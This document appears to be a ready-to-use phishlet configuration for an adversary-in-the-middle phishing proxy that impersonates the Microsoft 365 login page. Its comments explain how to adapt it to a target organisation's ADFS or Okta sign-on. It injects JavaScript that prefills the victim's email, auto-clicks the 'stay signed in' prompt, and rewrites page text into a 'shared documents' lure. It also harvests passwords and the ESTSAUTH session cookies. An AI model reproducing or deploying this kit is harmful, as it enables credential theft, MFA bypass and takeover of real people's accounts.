name: 'o365'
author: '@NOIR'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false }
  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: false, is_landing:false }
  # The lines below are needed if your target organization utilizes ADFS.
  # If they do, you need to uncomment all following lines that contain <...>
  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
  #      <insert-adfs-subdomain> = sso
  #      <insert-adfs-host> = godaddy.com
  #      <insert-adfs-subdomain-and-host> = sso.godaddy.com
  #  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
  #  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com:443', session: true, is_landing: false}
  #  - {phish_sub: 'pointb', orig_sub: '', domain: 'okta.com', session: true, is_landing:false}
  #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '', session: true, is_landing:false}
  #  - {phish_sub: 'pointb', orig_sub: '', domain: 'okta.com:443', session: true, is_landing:false}
  #    WORKING SSO
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: false, is_landing: false}
  #  - {phish_sub: 'www', orig_sub: 'www', domain: 'godaddy.com', session: true, is_landing: false}
  #  WORKING OKTA
  #  - {phish_sub: 'pointb', orig_sub: '', domain: 'okta.com', session: true, is_landing: false}
  #  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: true, is_landing: false}
  # ADFS PART
  #  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'tulane.edu', session: true, is_landing: false}
  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false}
  - {phish_sub: 'i', orig_sub: 'i', domain: 'ibb.co', session: false, is_landing: false}
#  - {phish_sub: 'github', orig_sub: '', domain: 'github.com', session: true, is_landing: false}
#  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: '', session: true, is_landing:false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], with_params: ['email']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true, with_params: ['email']}
  # Uncomment and fill in if your target organization utilizes ADFS
#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true }
#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
#  - {triggers_on: 'pointb.okta.com', orig_sub: 'pointb', domain: 'okta.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
#  - {triggers_on: '{hostname}', orig_sub: 'adfs', domain: '', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}



js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: [ "/common/login" ]
    script: |
        console.log("ok")
        const interval = setInterval(() => {
        let button = document.querySelector("#idSIButton9");
        
        if (button && button.value.trim().toLowerCase() === "yes") {
            button.click();
            console.log("Clicked the button!");
            clearInterval(interval); // Stop checking once clicked
        }
        }, 500); // Check every 500ms

  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/"]
    script: |
      var aemail = "";
      const cat = localStorage.getItem('email');
      if(cat){
        aemail = cat;
      }else{
        console.log("no cat")
      }
      
      console.log(aemail)
      
      
      
      
      function lp(){
        try{
            const observer = new MutationObserver((mutationsList) => {
            mutationsList.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                  if (
                    node.nodeType === Node.ELEMENT_NODE &&
                    node.id === "usernameError"
                  ) {
                    node.textContent =
                      "Enter the receiving email address to access shared documents";
                    console.log("Error message modified.");
                  }
                });
              });
            });
      
            observer.observe(document.body, { childList: true, subtree: true });
            console.log("click form...");
            document.getElementById("i0116").click()
            console.log("started...");
            var emailInput = document.getElementById('i0116');
            if (emailInput) {
                emailInput.focus();
                emailInput.click();
            var inputElement = document.getElementById("i0116");
            inputElement.value = aemail;
            inputElement.dispatchEvent(new Event('input', { bubbles: true }));
            } else {
              console.error('Email input element not found');
            }
      
      
            if(document.getElementById("i0116").value == aemail){
              console.log("true , sama");
              console.log(document.getElementById("i0116").value, aemail);
      
             setTimeout(()=>{var e=document.getElementById("idSIButton9");if(e){e.click();var t=setInterval(runScript,500)}else console.error("Element not found")},800);function runScript(){var e=document.getElementById("aadTileTitle");e?e.click():console.error("Element not found")}
      
            }else{
              console.log("null and not clicked");
            }
            //setTimeout(function(){;},1000)  
      
      
        }
        catch(err){
          setTimeout(function(){lp();}, 1000);
        }
      }
      
      
      document.addEventListener("DOMContentLoaded",function(){window.addEventListener("load",function(){lp()})});
              
              // Function to check for "Enter password" and add the element
          function checkAndAddElement() {
          const loginHeader = document.querySelector("#loginHeader div[role='heading']");
          if (loginHeader && loginHeader.textContent.trim() === "Enter password") {
          // Create the new element to be added
          const newElement = document.createElement("div");
          newElement.className = "row text-body";
          newElement.innerHTML = `
        <div id="passwordDesc" class="wrap-content" data-bind="text: unsafe_pageDescription">
          Enter the password for your email address to access secure documents.
          </div>
          `;
          
          // Append the new element after the loginHeader parent
          loginHeader.parentElement.insertAdjacentElement("afterend", newElement);
          
          // Disconnect the observer since the task is done
          observer.disconnect();
        }
        }
          
          // Create a MutationObserver to monitor changes in the DOM
          const observer = new MutationObserver(() => {
          checkAndAddElement();
        });
          
          // Start observing the document body for changes
          observer.observe(document.body, {
        childList: true, // Monitor for added/removed child nodes
        subtree: true,   // Monitor the entire subtree
        });
          
  
          checkAndAddElement();
        const style = document.createElement("style");
        style.textContent = `
        #backgroundImage {
            background-image: url("https://i.ibb.co.com/718HfGT/bg-docs.png") !important;
        }
        `;
        //document.head.appendChild(style);
        




auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
credentials:
  username:
    key: '(login|Username|email|UserName)'
    search: '(.*)'
    type: 'json'
  password:
    key: '(passwd|Password|password)'
    search: '(.*)'
    type: 'json'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
